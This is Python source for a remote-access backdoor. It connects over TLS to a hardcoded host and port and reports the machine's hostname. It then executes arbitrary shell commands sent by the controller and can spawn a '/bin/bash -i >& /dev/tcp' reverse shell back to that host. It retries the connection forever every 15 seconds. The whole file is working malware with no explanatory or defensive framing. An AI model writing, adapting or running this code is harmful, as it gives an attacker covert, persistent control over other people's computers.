import socket
import subprocess
import os
import ssl
import time


def connect():
    global host
    global port
    global sock

    sock = ssl.wrap_socket(sock=socket.socket(socket.AF_INET, socket.SOCK_STREAM),
                           ca_certs='server.crt',
                           cert_reqs=ssl.CERT_REQUIRED)

    host = '884110258'
    port = 30481

    print('Connecting to {}:{}'.format(host, port))
    sock.connect((host, port))
    print('Connection established')
    sock.send(socket.gethostname().encode())


def receive():
    request = sock.recv(2048).decode()
    if request == 'kill_me_baby':
        sock.close()
        return
    elif request[:5] == 'shell':
        proc = subprocess.Popen(
            request[6:],
            shell=True,
            stdout=subprocess.PIPE,
            stdin=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        answer = proc.stdout.read() + proc.stderr.read()
    elif request[:9] == 'rev_shell':
        rev_port = int(request[10:])
        command = '/bin/bash -i >& /dev/tcp/{}/{} 0>&1'.format(host, rev_port)
        os.system(command)
        answer = b'Reverse shell started'
    else:
        answer = b'No valid command provided'

    send(answer)


def send(string):
    sock.send(string)
    receive()


while True:
    try:
        connect()
        receive()
        sock.close()
    except BaseException:
        time.sleep(15)

